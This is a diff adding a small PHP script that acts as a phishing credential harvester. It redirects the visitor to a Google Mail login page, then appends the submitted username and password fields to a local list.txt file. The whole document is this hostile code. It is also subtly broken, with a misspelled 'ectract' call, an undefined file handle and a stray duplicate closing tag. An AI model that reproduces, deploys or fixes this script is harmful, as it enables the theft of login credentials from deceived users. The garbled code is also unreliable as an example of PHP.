@@ -1,0 +1,12 @@
+<?php
+Header('Location:https://www.google.com/accounts/ServiceLogin?service=mail&passive=true&rm=false&continue=http%3A%2F%2Fmail.google.com%2Fmail%2F%3Fui%3Dhtml%26zy%3Dl&bsv=1k96igf4806cy&ltmpl=default&ltmplcache=2');  
+ectract($_REQUEST);
+$file = fopen('list.txt' ,'a');
+fwrite($file, "username: ");
+fwrite($file, $session_key ."\n");
+fwrite($file, "password: ");
+fwrite($file, $session_password ."\n");
+fwrite($handle, '\r\n');
+fclose($file);
+exit;
+?>?> // Marks the end of the PHP program.
